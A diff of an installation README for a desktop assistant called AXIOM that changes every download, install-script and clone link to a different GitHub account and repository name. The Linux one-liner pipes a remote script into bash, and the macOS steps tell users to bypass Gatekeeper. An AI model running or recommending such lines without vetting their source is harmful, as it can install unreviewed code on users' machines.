@@ -22,23 +22,23 @@ No subscriptions. No cloud lock-in. Your machine, your data.
 ## Download & Install
 
 ### macOS
-1. Download `AXIOM-mac-arm64.dmg` (Apple Silicon) or `AXIOM-mac-x64.dmg` (Intel) from [Releases](https://github.com/josephsierengowski/axiom/releases)
+1. Download `AXIOM-mac-arm64.dmg` (Apple Silicon) or `AXIOM-mac-x64.dmg` (Intel) from [Releases](https://github.com/sierengowskisierengowski-cpu/Desktop-Assistant-AI/releases)
 2. Open the `.dmg` and drag **AXIOM** into your Applications folder
 3. First launch: right-click → **Open** to bypass macOS Gatekeeper
 4. AXIOM appears in your menu bar — press **⌘ Shift Space** to open it from anywhere
 
 ### Windows
-1. Download `AXIOM-Setup-win-x64.exe` from [Releases](https://github.com/josephsierengowski/axiom/releases)
+1. Download `AXIOM-Setup-win-x64.exe` from [Releases](https://github.com/sierengowskisierengowski-cpu/Desktop-Assistant-AI/releases)
 2. Run the installer — creates Start Menu and optional desktop shortcuts
 3. AXIOM starts in the system tray — press **Ctrl+Shift+Space** to open it anywhere
 
 ### Linux — one-liner install
 ```bash
-curl -fsSL https://raw.githubusercontent.com/josephsierengowski/axiom/main/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/sierengowskisierengowski-cpu/Desktop-Assistant-AI/main/install.sh | bash
 ```
 That's it. No cloning, no building. The script downloads the latest AppImage, makes it executable, and adds it to your app launcher.
 
-Or manually: download `AXIOM-linux-x86_64.AppImage` from [Releases](https://github.com/josephsierengowski/axiom/releases), `chmod +x` it, and run it.
+Or manually: download `AXIOM-linux-x86_64.AppImage` from [Releases](https://github.com/sierengowskisierengowski-cpu/Desktop-Assistant-AI/releases), `chmod +x` it, and run it.
 
 ---
 
@@ -124,7 +124,7 @@ pnpm --version    # should print 8.x or higher
 ### Step 2 — Clone and install dependencies
 
 ```bash
-git clone https://github.com/josephsierengowski/axiom.git
+git clone https://github.com/sierengowskisierengowski-cpu/Desktop-Assistant-AI.git
 cd axiom
 pnpm install
 ```
